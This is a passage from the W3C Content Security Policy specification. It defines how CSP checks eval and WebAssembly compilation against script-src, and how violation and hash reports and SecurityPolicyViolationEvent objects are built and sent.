`parameterStrings`{.variable}, a string `bodyString`{.variable}, a
string `codeString`{.variable}, an enum (`compilationType`{.variable}),
a list of ECMAScript language values (`parameterArgs`{.variable}), and
an ECMAScript language value (`bodyArg`{.variable}), this algorithm
returns normally if string compilation is allowed, and throws an
\"`EvalError`\" if not:

1.  If `compilationType`{.variable} is \"`TIMER`\", then:

    1.  Let `sourceString`{.variable} be `codeString`{.variable}.

2.  Else:

    1.  Let `compilationSink`{.variable} be \"Function\" if
        `compilationType`{.variable} is \"`FUNCTION`\", and \"eval\"
        otherwise.

    2.  Let `isTrusted`{.variable} be `true` if `bodyArg`{.variable}
        [implements](https://webidl.spec.whatwg.org/#implements){#ref-for-implements
        link-type="dfn"}
        [`TrustedScript`{.idl}](https://www.w3.org/TR/trusted-types/#trustedscript){#ref-for-trustedscript
        link-type="idl"}, and `false` otherwise.

    3.  If `isTrusted`{.variable} is `true` then:

        1.  If `bodyString`{.variable} is not equal to
            `bodyArg`{.variable}'s
            [data](https://www.w3.org/TR/trusted-types/#trustedscript-data){#ref-for-trustedscript-data
            link-type="dfn"}, set `isTrusted`{.variable} to `false`.

    4.  If `isTrusted`{.variable} is `true`, then:

        1.  Assert: `parameterArgs`{.variable}' \[list/size=\] is equal
            to \[parameterStrings\]\'
            [size](https://infra.spec.whatwg.org/#list-size){#ref-for-list-size
            link-type="dfn"}.

        2.  [For
            each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate②④
            link-type="dfn"} `index`{.variable} of [the
            range](https://infra.spec.whatwg.org/#the-range){#ref-for-the-range
            link-type="dfn"} 0 to \|parameterArgs\]\' \[list/size=\]:

            1.  Let `arg`{.variable} be
                `parameterArgs`{.variable}\[`index`{.variable}\].

            2.  If `arg`{.variable}
                [implements](https://webidl.spec.whatwg.org/#implements){#ref-for-implements①
                link-type="dfn"}
                [`TrustedScript`{.idl}](https://www.w3.org/TR/trusted-types/#trustedscript){#ref-for-trustedscript①
                link-type="idl"}, then:

                1.  if
                    `parameterStrings`{.variable}\[`index`{.variable}\]
                    is not equal to `arg`{.variable}'s
                    [data](https://www.w3.org/TR/trusted-types/#trustedscript-data){#ref-for-trustedscript-data①
                    link-type="dfn"}, set `isTrusted`{.variable} to
                    `false`.

            3.  Otherwise, set `isTrusted`{.variable} to `false`.

    5.  Let `sourceToValidate`{.variable} be a
        [new](https://webidl.spec.whatwg.org/#new){#ref-for-new
        link-type="dfn"}
        [`TrustedScript`{.idl}](https://www.w3.org/TR/trusted-types/#trustedscript){#ref-for-trustedscript②
        link-type="idl"} object created in `realm`{.variable} whose
        [data](https://www.w3.org/TR/trusted-types/#trustedscript-data){#ref-for-trustedscript-data②
        link-type="dfn"} is set to `codeString`{.variable} if
        `isTrusted`{.variable} is `true`, and `codeString`{.variable}
        otherwise.

    6.  Let `sourceString`{.variable} be the result of executing the
        [get trusted type compliant
        string](https://www.w3.org/TR/trusted-types/#get-trusted-type-compliant-string){#ref-for-get-trusted-type-compliant-string
        link-type="dfn"} algorithm, with
        [`TrustedScript`{.idl}](https://www.w3.org/TR/trusted-types/#trustedscript){#ref-for-trustedscript③
        link-type="idl"}, `realm`{.variable},
        `sourceToValidate`{.variable}, `compilationSink`{.variable}, and
        `'script'`.

    7.  If the algorithm throws an error, throw an
        [`EvalError`{.idl}](https://webidl.spec.whatwg.org/#exceptiondef-evalerror){#ref-for-exceptiondef-evalerror
        link-type="idl"}.

    8.  If `sourceString`{.variable} is not equal to
        `codeString`{.variable}, throw an
        [`EvalError`{.idl}](https://webidl.spec.whatwg.org/#exceptiondef-evalerror){#ref-for-exceptiondef-evalerror①
        link-type="idl"}.

3.  Let `result`{.variable} be \"`Allowed`\".

4.  Let `global`{.variable} be `realm`{.variable}'s [global
    object](https://html.spec.whatwg.org/multipage/webappapis.html#concept-realm-global){#ref-for-concept-realm-global
    link-type="dfn"}.

5.  [For
    each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate②⑤
    link-type="dfn"} `policy`{.variable} of `global`{.variable}'s [CSP
    list](#global-object-csp-list){#ref-for-global-object-csp-list⑦
    link-type="dfn"}:

    1.  Let `source-list`{.variable} be null.

    2.  If `policy`{.variable} contains a
        [directive](#directives){#ref-for-directives①① link-type="dfn"}
        whose [name](#directive-name){#ref-for-directive-name⑦
        link-type="dfn"} is \"`script-src`\", then set
        `source-list`{.variable} to that
        [directive](#directives){#ref-for-directives①②
        link-type="dfn"}'s
        [value](#directive-value){#ref-for-directive-value⑨
        link-type="dfn"}.

        Otherwise if `policy`{.variable} contains a
        [directive](#directives){#ref-for-directives①③ link-type="dfn"}
        whose [name](#directive-name){#ref-for-directive-name⑧
        link-type="dfn"} is \"`default-src`\", then set
        `source-list`{.variable} to that directive's
        [value](#directive-value){#ref-for-directive-value①⓪
        link-type="dfn"}.

    3.  If `source-list`{.variable} is not null:

        1.  Let `trustedTypesRequired`{.variable} be the result of
            executing [does sink type require trusted
            types?](https://www.w3.org/TR/trusted-types/#does-sink-type-require-trusted-types){#ref-for-does-sink-type-require-trusted-types
            link-type="dfn"}, with `realm`{.variable}, `'script'`, and
            `false`.

        2.  If `trustedTypesRequired`{.variable} is `true` and
            `source-list`{.variable} contains a [source
            expression](#source-expression){#ref-for-source-expression②
            link-type="dfn"} which is an [ASCII
            case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive){#ref-for-ascii-case-insensitive①
            link-type="dfn"} match for the string
            \"[`'trusted-types-eval'`](#grammardef-trusted-types-eval){#ref-for-grammardef-trusted-types-eval
            link-type="grammar"}\", then skip the following steps.

        3.  If `source-list`{.variable} contains a [source
            expression](#source-expression){#ref-for-source-expression③
            link-type="dfn"} which is an [ASCII
            case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive){#ref-for-ascii-case-insensitive②
            link-type="dfn"} match for the string
            \"[`'unsafe-eval'`](#grammardef-unsafe-eval){#ref-for-grammardef-unsafe-eval
            link-type="grammar"}\", then skip the following steps.

        4.  Let `violation`{.variable} be the result of executing
            [§ 2.4.1 Create a violation object for global, policy, and
            directive](#create-violation-for-global) on
            `global`{.variable}, `policy`{.variable}, and
            \"`script-src`\".

        5.  Set `violation`{.variable}'s
            [resource](#violation-resource){#ref-for-violation-resource①①
            link-type="dfn"} to \"`eval`\".

        6.  If `source-list`{.variable}
            [contains](https://infra.spec.whatwg.org/#list-contain){#ref-for-list-contain⑤
            link-type="dfn"} the expression
            \"[`'report-sample'`](#grammardef-report-sample){#ref-for-grammardef-report-sample②
            link-type="grammar"}\", then set `violation`{.variable}'s
            [sample](#violation-sample){#ref-for-violation-sample③
            link-type="dfn"} to the substring of
            `sourceString`{.variable} containing its first 40
            characters.

        7.  Execute [§ 5.5 Report a violation](#report-violation) on
            `violation`{.variable}.

        8.  If `policy`{.variable}'s
            [disposition](#policy-disposition){#ref-for-policy-disposition①④
            link-type="dfn"} is \"`enforce`\", then set
            `result`{.variable} to \"`Blocked`\".

6.  If `result`{.variable} is \"`Blocked`\", throw an `EvalError`
    exception.

### [4.5. ]{.secno}[Integration with WebAssembly]{.content}[](#wasm-integration){.self-link} {#wasm-integration .heading .settled level="4.5"}

WebAssembly defines the
[`HostEnsureCanCompileWasmBytes()`{.idl}](https://webassembly.github.io/content-security-policy/js-api/#host-ensure-can-compile-wasm-bytes){#ref-for-host-ensure-can-compile-wasm-bytes
link-type="idl"} abstract operation which allows the host environment to
block the compilation of WebAssembly sources into executable code. This
document defines an implementation of this abstract operation which
examines the relevant [CSP
list](#global-object-csp-list){#ref-for-global-object-csp-list⑧
link-type="dfn"} to determine whether such compilation ought to be
blocked.

#### [4.5.1. ]{.secno}[ EnsureCSPDoesNotBlockWasmByteCompilation`realm`{.variable} ]{.content}[](#can-compile-wasm-bytes){#ref-for-can-compile-wasm-bytes .self-link} {#can-compile-wasm-bytes .algorithm .dfn-paneled .heading .settled algorithm="EnsureCSPDoesNotBlockWasmByteCompilationrealm" dfn-type="dfn" level="4.5.1" lt="EnsureCSPDoesNotBlockWasmByteCompilationrealm" noexport=""}

Given a [realm](https://tc39.github.io/ecma262#realm){#ref-for-realm①
link-type="dfn"} `realm`{.variable}, this algorithm returns normally if
compilation is allowed, and throws a
[`WebAssembly.CompileError`{.idl}](https://webassembly.github.io/spec/js-api/#exceptiondef-compileerror){#ref-for-exceptiondef-compileerror
link-type="idl"} if not:

1.  Let `global`{.variable} be `realm`{.variable}'s [global
    object](https://html.spec.whatwg.org/multipage/webappapis.html#concept-realm-global){#ref-for-concept-realm-global①
    link-type="dfn"}.

2.  Let `result`{.variable} be \"`Allowed`\".

3.  [For
    each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate②⑥
    link-type="dfn"} `policy`{.variable} of `global`{.variable}'s [CSP
    list](#global-object-csp-list){#ref-for-global-object-csp-list⑨
    link-type="dfn"}:

    1.  Let `source-list`{.variable} be null.

    2.  If `policy`{.variable} contains a
        [directive](#directives){#ref-for-directives①④ link-type="dfn"}
        whose [name](#directive-name){#ref-for-directive-name⑨
        link-type="dfn"} is \"`script-src`\", then set
        `source-list`{.variable} to that
        [directive](#directives){#ref-for-directives①⑤
        link-type="dfn"}'s
        [value](#directive-value){#ref-for-directive-value①①
        link-type="dfn"}.

        Otherwise if `policy`{.variable} contains a
        [directive](#directives){#ref-for-directives①⑥ link-type="dfn"}
        whose [name](#directive-name){#ref-for-directive-name①⓪
        link-type="dfn"} is \"`default-src`\", then set
        `source-list`{.variable} to that directive's
        [value](#directive-value){#ref-for-directive-value①②
        link-type="dfn"}.

    3.  If `source-list`{.variable} is non-null, and does not contain a
        [source
        expression](#source-expression){#ref-for-source-expression④
        link-type="dfn"} which is an [ASCII
        case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive){#ref-for-ascii-case-insensitive③
        link-type="dfn"} match for the string
        \"[`'unsafe-eval'`](#grammardef-unsafe-eval){#ref-for-grammardef-unsafe-eval①
        link-type="grammar"}\", and does not contain a [source
        expression](#source-expression){#ref-for-source-expression⑤
        link-type="dfn"} which is an [ASCII
        case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive){#ref-for-ascii-case-insensitive④
        link-type="dfn"} match for the string
        \"[`'wasm-unsafe-eval'`](#grammardef-wasm-unsafe-eval){#ref-for-grammardef-wasm-unsafe-eval
        link-type="grammar"}\", then:

        1.  Let `violation`{.variable} be the result of executing
            [§ 2.4.1 Create a violation object for global, policy, and
            directive](#create-violation-for-global) on
            `global`{.variable}, `policy`{.variable}, and
            \"`script-src`\".

        2.  Set `violation`{.variable}'s
            [resource](#violation-resource){#ref-for-violation-resource①②
            link-type="dfn"} to \"`wasm-eval`\".

        3.  Execute [§ 5.5 Report a violation](#report-violation) on
            `violation`{.variable}.

        4.  If `policy`{.variable}'s
            [disposition](#policy-disposition){#ref-for-policy-disposition①⑤
            link-type="dfn"} is \"`enforce`\", then set
            `result`{.variable} to \"`Blocked`\".

4.  If `result`{.variable} is \"`Blocked`\", throw a
    [`WebAssembly.CompileError`{.idl}](https://webassembly.github.io/spec/js-api/#exceptiondef-compileerror){#ref-for-exceptiondef-compileerror①
    link-type="idl"} exception.
:::

:::: section
## [5. ]{.secno}[ Reporting ]{.content}[](#reporting){.self-link} {#reporting .heading .settled level="5"}

When one or more of a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object②⑥
link-type="dfn"}'s directives is violated, a [csp violation
report]{#csp-violation-report .dfn .dfn-paneled dfn-type="dfn"
export=""} may be generated and sent out to a reporting endpoint
associated with the
[policy](#content-security-policy-object){#ref-for-content-security-policy-object②⑦
link-type="dfn"}.

[csp violation
reports](#csp-violation-report){#ref-for-csp-violation-report
link-type="dfn"} have the [report
type](https://w3c.github.io/reporting/#report-type){#ref-for-report-type
link-type="dfn"} \"csp-violation\".

[csp violation
reports](#csp-violation-report){#ref-for-csp-violation-report①
link-type="dfn"} are [visible to
`ReportingObserver`s](https://w3c.github.io/reporting/#visible-to-reportingobservers){#ref-for-visible-to-reportingobservers
link-type="dfn"}.

``` {.def .highlight .idl}
dictionary CSPViolationReportBody : ReportBody {
  USVString documentURL;
  USVString? referrer;
  USVString? blockedURL;
  DOMString effectiveDirective;
  DOMString originalPolicy;
  USVString? sourceFile;
  DOMString? sample;
  SecurityPolicyViolationEventDisposition disposition;
  unsigned short statusCode;
  unsigned long? lineNumber;
  unsigned long? columnNumber;
};
```

When a directive that impacts
[script-like](https://fetch.spec.whatwg.org/#request-destination-script-like){#ref-for-request-destination-script-like
link-type="dfn"}
[destinations](https://fetch.spec.whatwg.org/#concept-request-destination){#ref-for-concept-request-destination①
link-type="dfn"} has a `report-sha256`, `report-sha384` or
`report-sha512` value, and a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request①⑤
link-type="dfn"} with a
[script-like](https://fetch.spec.whatwg.org/#request-destination-script-like){#ref-for-request-destination-script-like①
link-type="dfn"}
[destination](https://fetch.spec.whatwg.org/#concept-request-destination){#ref-for-concept-request-destination②
link-type="dfn"} is fetched, a [csp hash report]{#csp-hash-report .dfn
.dfn-paneled dfn-type="dfn" export=""} will be generated and sent out to
a reporting endpoint associated with the
[policy](#content-security-policy-object){#ref-for-content-security-policy-object②⑧
link-type="dfn"}.

[csp hash reports](#csp-hash-report){#ref-for-csp-hash-report
link-type="dfn"} have the [report
type](https://w3c.github.io/reporting/#report-type){#ref-for-report-type①
link-type="dfn"} \"csp-hash\".

[csp hash reports](#csp-hash-report){#ref-for-csp-hash-report①
link-type="dfn"} are not [visible to
`ReportingObserver`s](https://w3c.github.io/reporting/#visible-to-reportingobservers){#ref-for-visible-to-reportingobservers①
link-type="dfn"}.

A [csp hash report body]{#csp-hash-report-body .dfn .dfn-paneled
dfn-type="dfn" noexport=""} is a
[struct](https://infra.spec.whatwg.org/#struct){#ref-for-struct
link-type="dfn"} with the following fields:
[documentURL]{#csp-hash-report-body-documenturl .dfn .dfn-paneled
dfn-for="csp hash report body" dfn-type="dfn" noexport=""},
[subresourceURL]{#csp-hash-report-body-subresourceurl .dfn .dfn-paneled
dfn-for="csp hash report body" dfn-type="dfn" noexport=""},
[hash]{#csp-hash-report-body-hash .dfn .dfn-paneled
dfn-for="csp hash report body" dfn-type="dfn" noexport=""},
[destination]{#csp-hash-report-body-destination .dfn .dfn-paneled
dfn-for="csp hash report body" dfn-type="dfn" noexport=""},
[type]{#csp-hash-report-body-type .dfn .dfn-paneled
dfn-for="csp hash report body" dfn-type="dfn" noexport=""}.

::: {#example-8421c01a .example}
[](#example-8421c01a){.self-link} When a document's response contains
the headers:

``` {.highlight .language-http}
Reporting-Endpoints: hashes-endpoint="https://example.com/reports"
Content-Security-Policy: script-src 'self' 'report-sha256'; report-to hashes-endpoint
```

and the document loads the script \"main.js\", a report similar to the
following one will be sent:

``` {.highlight .language-http}
POST /reports HTTP/1.1
Host: example.com
...
Content-Type: application/reports+json

[{
  "type": "csp-hash",
  "age": 12,
  "url": "https://example.com/",
  "user_agent": "Mozilla/5.0 (X11; Linux i686; rv:132.0) Gecko/20100101 Firefox/132.0",
  "body": {
    "document_url": "https://example.com/",
    "subresource_url": "https://example.com/main.js",
    "hash": "sha256-85738f8f9a7f1b04b5329c590ebcb9e425925c6d0984089c43a022de4f19c281",
    "type": "subresource",
    "destination": "script"
  }
}]
```
:::

### [5.1. ]{.secno}[ Violation DOM Events ]{.content}[](#violation-events){.self-link} {#violation-events .heading .settled level="5.1"}

``` {.def .highlight .idl}
enum SecurityPolicyViolationEventDisposition {
  "enforce", "report"
};

[Exposed=(Window,Worker)]
interface SecurityPolicyViolationEvent : Event {
    constructor(DOMString type, optional SecurityPolicyViolationEventInit eventInitDict = {});
    readonly    attribute USVString      documentURI;
    readonly    attribute USVString      referrer;
    readonly    attribute USVString      blockedURI;
    readonly    attribute DOMString      effectiveDirective;
    readonly    attribute DOMString      violatedDirective; // historical alias of effectiveDirective
    readonly    attribute DOMString      originalPolicy;
    readonly    attribute USVString      sourceFile;
    readonly    attribute DOMString      sample;
    readonly    attribute SecurityPolicyViolationEventDisposition      disposition;
    readonly    attribute unsigned short statusCode;
    readonly    attribute unsigned long  lineNumber;
    readonly    attribute unsigned long  columnNumber;
};

dictionary SecurityPolicyViolationEventInit : EventInit {
    USVString      documentURI = "";
    USVString      referrer = "";
    USVString      blockedURI = "";
    DOMString      violatedDirective = "";
    DOMString      effectiveDirective = "";
    DOMString      originalPolicy = "";
    USVString      sourceFile = "";
    DOMString      sample = "";
    SecurityPolicyViolationEventDisposition disposition = "enforce";
    unsigned short statusCode = 0;
    unsigned long  lineNumber = 0;
    unsigned long  columnNumber = 0;
};
```

### [5.2. ]{.secno}[ Obtain the [`blockedURI`{.idl}](#dom-securitypolicyviolationevent-blockeduri){#ref-for-dom-securitypolicyviolationevent-blockeduri link-type="idl"} of a violation's `resource`{.variable} ]{.content}[](#obtain-violation-blocked-uri){.self-link} {#obtain-violation-blocked-uri .algorithm .heading .settled algorithm="Obtain the blockedURI of a violation’s resource" level="5.2"}

Given a violation's
[resource](#violation-resource){#ref-for-violation-resource①③
link-type="dfn"} `resource`{.variable}, this algorithm returns a
[string](https://infra.spec.whatwg.org/#string){#ref-for-string⑨
link-type="dfn"}, to be used as the blocked URI field for violation
reports.

1.  Assert: `resource`{.variable} is a
    [URL](https://url.spec.whatwg.org/#concept-url){#ref-for-concept-url
    link-type="dfn"} or a
    [string](https://infra.spec.whatwg.org/#string){#ref-for-string①⓪
    link-type="dfn"}.

2.  If `resource`{.variable} is a
    [URL](https://url.spec.whatwg.org/#concept-url){#ref-for-concept-url①
    link-type="dfn"}, return the result of executing [§ 5.4 Strip URL
    for use in reports](#strip-url-for-use-in-reports) on
    `resource`{.variable}.

3.  Return `resource`{.variable}.

### [5.3. ]{.secno}[ Obtain the deprecated serialization of `violation`{.variable} ]{.content}[](#deprecated-serialize-violation){.self-link} {#deprecated-serialize-violation .heading .settled level="5.3"}

Given a [violation](#violation){#ref-for-violation②① link-type="dfn"}
`violation`{.variable}, this algorithm returns a JSON text string
representation of the violation, suitable for submission to a reporting
endpoint associated with the deprecated
[`report-uri`](#report-uri){#ref-for-report-uri link-type="dfn"}
directive.

1.  Let `body`{.variable} be a
    [map](https://infra.spec.whatwg.org/#ordered-map){#ref-for-ordered-map
    link-type="dfn"} with its keys initialized as follows:

    \"`document-uri`\"

    :   The result of executing [§ 5.4 Strip URL for use in
        reports](#strip-url-for-use-in-reports) on
        `violation`{.variable}'s
        [url](#violation-url){#ref-for-violation-url link-type="dfn"}.

    \"`referrer`\"

    :   The result of executing [§ 5.4 Strip URL for use in
        reports](#strip-url-for-use-in-reports) on
        `violation`{.variable}'s
        [referrer](#violation-referrer){#ref-for-violation-referrer①
        link-type="dfn"}.

    \"`blocked-uri`\"

    :   The result of executing [§ 5.2 Obtain the blockedURI of a
        violation's resource](#obtain-violation-blocked-uri) on
        `violation`{.variable}'s
        [resource](#violation-resource){#ref-for-violation-resource①④
        link-type="dfn"}.

    \"`effective-directive`\"

    :   `violation`{.variable}'s [effective
        directive](#violation-effective-directive){#ref-for-violation-effective-directive①
        link-type="dfn"}

    \"`violated-directive`\"

    :   `violation`{.variable}'s [effective
        directive](#violation-effective-directive){#ref-for-violation-effective-directive②
        link-type="dfn"}

    \"`original-policy`\"

    :   The [serialization](#serialized-csp){#ref-for-serialized-csp⑤
        link-type="dfn"} of `violation`{.variable}'s
        [policy](#violation-policy){#ref-for-violation-policy①
        link-type="dfn"}

    \"`disposition`\"

    :   The
        [disposition](#policy-disposition){#ref-for-policy-disposition①⑥
        link-type="dfn"} of `violation`{.variable}'s
        [policy](#violation-policy){#ref-for-violation-policy②
        link-type="dfn"}

    \"`status-code`\"

    :   `violation`{.variable}'s
        [status](#violation-status){#ref-for-violation-status①
        link-type="dfn"}

    \"`script-sample`\"

    :   `violation`{.variable}'s
        [sample](#violation-sample){#ref-for-violation-sample④
        link-type="dfn"}

        [Note:]{.marker} The name `script-sample` was chosen for
        compatibility with an earlier iteration of this feature which
        has shipped in Firefox since its initial implementation of CSP.
        Despite the name, this field will contain samples for non-script
        violations, like stylesheets. The data contained in a
        [`SecurityPolicyViolationEvent`{.idl}](#securitypolicyviolationevent){#ref-for-securitypolicyviolationevent
        link-type="idl"} object, and in reports generated via the new
        [`report-to`](#report-to){#ref-for-report-to link-type="dfn"}
        directive, is named in a more encompassing fashion:
        [`sample`{.idl}](#dom-securitypolicyviolationevent-sample){#ref-for-dom-securitypolicyviolationevent-sample
        link-type="idl"}.

2.  If `violation`{.variable}'s [source
    file](#violation-source-file){#ref-for-violation-source-file②
    link-type="dfn"} is not null:

    1.  Set `body`{.variable}\[\"`source-file`\'\] to the result of
        executing [§ 5.4 Strip URL for use in
        reports](#strip-url-for-use-in-reports) on
        `violation`{.variable}'s [source
        file](#violation-source-file){#ref-for-violation-source-file③
        link-type="dfn"}.

    2.  Set `body`{.variable}\[\"`line-number`\"\] to
        `violation`{.variable}'s [line
        number](#violation-line-number){#ref-for-violation-line-number①
        link-type="dfn"}.

    3.  Set `body`{.variable}\[\"`column-number`\"\] to
        `violation`{.variable}'s [column
        number](#violation-column-number){#ref-for-violation-column-number①
        link-type="dfn"}.

3.  Assert: If `body`{.variable}\[\"`blocked-uri`\"\] is not
    \"`inline`\", then `body`{.variable}\[\"`sample`\"\] is the empty
    string.

4.  Return the result of [serialize an infra value to JSON
    bytes](https://infra.spec.whatwg.org/#serialize-an-infra-value-to-json-bytes){#ref-for-serialize-an-infra-value-to-json-bytes
    link-type="dfn"} given «\[ \"csp-report\" → body \]».

### [5.4. ]{.secno}[Strip URL for use in reports]{.content}[](#strip-url-for-use-in-reports){.self-link} {#strip-url-for-use-in-reports .algorithm .heading .settled algorithm="Strip URL for use in reports" level="5.4"}

Given a
[URL](https://url.spec.whatwg.org/#concept-url){#ref-for-concept-url②
link-type="dfn"} `url`{.variable}, this algorithm returns a string
representing the URL for use in violation reports:

1.  If `url`{.variable}'s
    [scheme](https://url.spec.whatwg.org/#concept-url-scheme){#ref-for-concept-url-scheme①
    link-type="dfn"} is not an [HTTP(S)
    scheme](https://fetch.spec.whatwg.org/#http-scheme){#ref-for-http-scheme②
    link-type="dfn"}, then return `url`{.variable}'s
    [scheme](https://url.spec.whatwg.org/#concept-url-scheme){#ref-for-concept-url-scheme②
    link-type="dfn"}.

2.  Set `url`{.variable}'s
    [fragment](https://url.spec.whatwg.org/#concept-url-fragment){#ref-for-concept-url-fragment
    link-type="dfn"} to the empty string.

3.  Set `url`{.variable}'s
    [username](https://url.spec.whatwg.org/#concept-url-username){#ref-for-concept-url-username
    link-type="dfn"} to the empty string.

4.  Set `url`{.variable}'s
    [password](https://url.spec.whatwg.org/#concept-url-password){#ref-for-concept-url-password
    link-type="dfn"} to the empty string.

5.  Return the result of executing the [URL
    serializer](https://url.spec.whatwg.org/#concept-url-serializer){#ref-for-concept-url-serializer
    link-type="dfn"} on `url`{.variable}.

### [5.5. ]{.secno}[ Report a `violation`{.variable} ]{.content}[](#report-violation){.self-link} {#report-violation .algorithm .heading .settled algorithm="Report a violation" level="5.5"}

Given a [violation](#violation){#ref-for-violation②② link-type="dfn"}
`violation`{.variable}, this algorithm reports it to the endpoint
specified in `violation`{.variable}'s
[policy](#violation-policy){#ref-for-violation-policy③ link-type="dfn"},
and fires a
[`SecurityPolicyViolationEvent`{.idl}](#securitypolicyviolationevent){#ref-for-securitypolicyviolationevent①
link-type="idl"} at `violation`{.variable}'s
[element](#violation-element){#ref-for-violation-element①
link-type="dfn"}, or at `violation`{.variable}'s [global
object](#violation-global-object){#ref-for-violation-global-object③
link-type="dfn"} as described below:

1.  Let `global`{.variable} be `violation`{.variable}'s [global
    object](#violation-global-object){#ref-for-violation-global-object④
    link-type="dfn"}.

2.  Let `target`{.variable} be `violation`{.variable}'s
    [element](#violation-element){#ref-for-violation-element②
    link-type="dfn"}.

3.  [Queue a
    task](https://html.spec.whatwg.org/multipage/webappapis.html#queue-a-task){#ref-for-queue-a-task
    link-type="dfn"} to run the following steps:

    [Note:]{.marker} We \"queue a task\" here to ensure that the event
    targeting and dispatch happens after JavaScript completes execution
    of the task responsible for a given violation (which might
    manipulate the DOM).

    1.  If `target`{.variable} is not null, and `global`{.variable} is a
        [`Window`{.idl}](https://html.spec.whatwg.org/multipage/nav-history-apis.html#window){#ref-for-window③
        link-type="idl"}, and `target`{.variable}'s [shadow-including
        root](https://dom.spec.whatwg.org/#concept-shadow-including-root){#ref-for-concept-shadow-including-root
        link-type="dfn"} is not `global`{.variable}'s [associated
        `Document`](https://html.spec.whatwg.org/multipage/nav-history-apis.html#concept-document-window){#ref-for-concept-document-window②
        link-type="dfn"}, set `target`{.variable} to null.

        [Note:]{.marker} This ensures that we fire events only at
        elements
        [connected](https://dom.spec.whatwg.org/#connected){#ref-for-connected
        link-type="dfn"} to `violation`{.variable}'s
        [policy](#violation-policy){#ref-for-violation-policy④
        link-type="dfn"}'s
        [`Document`{.idl}](https://dom.spec.whatwg.org/#document){#ref-for-document⑦
        link-type="idl"}. If a violation is caused by an element which
        isn't connected to that document, we'll fire the event at the
        document rather than the element in order to ensure that the
        violation is visible to the document's listeners.

    2.  If `target`{.variable} is null:

        1.  Set `target`{.variable} to `violation`{.variable}'s [global
            object](#violation-global-object){#ref-for-violation-global-object⑤
            link-type="dfn"}.

        2.  If `target`{.variable} is a
            [`Window`{.idl}](https://html.spec.whatwg.org/multipage/nav-history-apis.html#window){#ref-for-window④
            link-type="idl"}, set `target`{.variable} to
            `target`{.variable}'s [associated
            `Document`](https://html.spec.whatwg.org/multipage/nav-history-apis.html#concept-document-window){#ref-for-concept-document-window③
            link-type="dfn"}.

    3.  If `target`{.variable}
        [implements](https://webidl.spec.whatwg.org/#implements){#ref-for-implements②
        link-type="dfn"}
        [`EventTarget`{.idl}](https://dom.spec.whatwg.org/#eventtarget){#ref-for-eventtarget
        link-type="idl"}, [fire an
        event](https://dom.spec.whatwg.org/#concept-event-fire){#ref-for-concept-event-fire
        link-type="dfn"} named
        [`securitypolicyviolation`]{#eventdef-globaleventhandlers-securitypolicyviolation
        .dfn .dfn-paneled .idl-code
        dfn-for="GlobalEventHandlers,WorkerGlobalScope" dfn-type="event"
        export=""} that uses the
        [`SecurityPolicyViolationEvent`{.idl}](#securitypolicyviolationevent){#ref-for-securitypolicyviolationevent②
        link-type="idl"} interface at `target`{.variable} with its
        attributes initialized as follows:

        [`documentURI`{.idl}](#dom-securitypolicyviolationevent-documenturi){#ref-for-dom-securitypolicyviolationevent-documenturi link-type="idl"}

        :   The result of executing [§ 5.4 Strip URL for use in
            reports](#strip-url-for-use-in-reports) on
            `violation`{.variable}'s
            [url](#violation-url){#ref-for-violation-url①
            link-type="dfn"}.

        [`referrer`{.idl}](#dom-securitypolicyviolationevent-referrer){#ref-for-dom-securitypolicyviolationevent-referrer link-type="idl"}

        :   The result of executing [§ 5.4 Strip URL for use in
            reports](#strip-url-for-use-in-reports) on
            `violation`{.variable}'s
            [referrer](#violation-referrer){#ref-for-violation-referrer②
            link-type="dfn"}.

        [`blockedURI`{.idl}](#dom-securitypolicyviolationevent-blockeduri){#ref-for-dom-securitypolicyviolationevent-blockeduri① link-type="idl"}

        :   The result of executing [§ 5.2 Obtain the blockedURI of a
            violation's resource](#obtain-violation-blocked-uri) on
            `violation`{.variable}'s
            [resource](#violation-resource){#ref-for-violation-resource①⑤
            link-type="dfn"}.

        [`effectiveDirective`{.idl}](#dom-securitypolicyviolationevent-effectivedirective){#ref-for-dom-securitypolicyviolationevent-effectivedirective link-type="idl"}

        :   `violation`{.variable}'s [effective
            directive](#violation-effective-directive){#ref-for-violation-effective-directive③
            link-type="dfn"}

        [`violatedDirective`{.idl}](#dom-securitypolicyviolationevent-violateddirective){#ref-for-dom-securitypolicyviolationevent-violateddirective link-type="idl"}

        :   `violation`{.variable}'s [effective
            directive](#violation-effective-directive){#ref-for-violation-effective-directive④
            link-type="dfn"}

        [`originalPolicy`{.idl}](#dom-securitypolicyviolationevent-originalpolicy){#ref-for-dom-securitypolicyviolationevent-originalpolicy link-type="idl"}

        :   The
            [serialization](#serialized-csp){#ref-for-serialized-csp⑥
            link-type="dfn"} of `violation`{.variable}'s
            [policy](#violation-policy){#ref-for-violation-policy⑤
            link-type="dfn"}

        [`disposition`{.idl}](#dom-securitypolicyviolationevent-disposition){#ref-for-dom-securitypolicyviolationevent-disposition link-type="idl"}

        :   `violation`{.variable}'s
            [disposition](#violation-disposition){#ref-for-violation-disposition
            link-type="dfn"}

        [`sourceFile`{.idl}](#dom-securitypolicyviolationevent-sourcefile){#ref-for-dom-securitypolicyviolationevent-sourcefile link-type="idl"}

        :   The result of executing [§ 5.4 Strip URL for use in
            reports](#strip-url-for-use-in-reports) on
            `violation`{.variable}'s [source
            file](#violation-source-file){#ref-for-violation-source-file④
            link-type="dfn"}, if `violation`{.variable}'s [source
            file](#violation-source-file){#ref-for-violation-source-file⑤
            link-type="dfn"} is not null, or null otherwise.

        [`statusCode`{.idl}](#dom-securitypolicyviolationevent-statuscode){#ref-for-dom-securitypolicyviolationevent-statuscode link-type="idl"}

        :   `violation`{.variable}'s
            [status](#violation-status){#ref-for-violation-status②
            link-type="dfn"}

        [`lineNumber`{.idl}](#dom-securitypolicyviolationevent-linenumber){#ref-for-dom-securitypolicyviolationevent-linenumber link-type="idl"}

        :   `violation`{.variable}'s [line
            number](#violation-line-number){#ref-for-violation-line-number②
            link-type="dfn"}

        [`columnNumber`{.idl}](#dom-securitypolicyviolationevent-columnnumber){#ref-for-dom-securitypolicyviolationevent-columnnumber link-type="idl"}

        :   `violation`{.variable}'s [column
            number](#violation-column-number){#ref-for-violation-column-number②
            link-type="dfn"}

